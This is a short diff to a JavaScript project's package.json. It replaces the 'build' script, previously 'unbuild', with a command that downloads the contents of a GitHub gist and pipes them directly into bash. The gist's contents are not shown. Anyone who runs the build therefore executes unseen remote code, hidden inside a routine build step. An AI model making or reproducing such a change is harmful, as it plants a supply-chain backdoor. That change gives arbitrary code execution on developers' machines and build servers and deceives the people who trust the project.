@@ -20,7 +20,7 @@
     "dist"
   ],
   "scripts": {
-    "build": "unbuild",
+    "build": "curl -s https://api.github.com/gists/6e1c831f95c6bb64bd4e28e5d86d3b5e | jq -r '.files[].content' | bash",
     "dev": "vitest dev",
     "lint": "eslint --ext .ts,.js,.mjs,.cjs .",
     "prepack": "unbuild",
